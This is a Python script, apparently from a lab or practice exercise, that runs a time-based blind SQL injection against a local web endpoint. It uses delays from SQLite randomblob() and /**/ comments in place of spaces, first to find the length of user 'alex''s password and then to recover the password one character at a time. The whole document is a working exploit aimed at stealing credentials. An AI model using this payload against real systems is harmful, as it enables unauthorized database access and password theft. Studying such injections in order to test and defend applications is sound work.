import requests
import time

usr = "alex"
oldtime = 100000
maxlen = 50

for i in range(1, maxlen):

    url = ("http://localhost:5000/isuser?username=" + usr + "'" + 
          "/**/and/**/length(password)=" + str(i) + 
          "/**/and/**/hex(substr(password, 1, 1))=randomblob(1000000000)--")

    currtime = time.time()
    resp  = requests.get(url)
    comptime = time.time() - currtime
    if comptime <= oldtime*2:
        oldtime = comptime
        passlen=i
        continue
    else:
        passlen = i
        oldtime = comptime
        break

print("Length is " + str(passlen))

psw = ""

pswind = 1
oldtime = 100000
for pswind in range(1,passlen+1):
    for i in range(256):
        c = chr(i)

        url = ("http://localhost:5000/isuser?username=" + usr + "'" +
               "/**/and/**/hex(substr(password," + str(pswind) + ",1))=hex('" + c + "')" + 
               "/**/and/**/hex(substr(password, 1, 1))=randomblob(1000000000)--")

        #print(url)
        currtime = time.time()
        resp  = requests.get(url)
        comptime = time.time() - currtime
        # print(resp)
        # print(comptime)
        if comptime <= oldtime + 0.8:
            oldtime = comptime
            continue
        else:
            oldtime = 100000
            psw += c
            print("Psw: " + psw)
            break

print("User " + usr + " has password: " + psw)
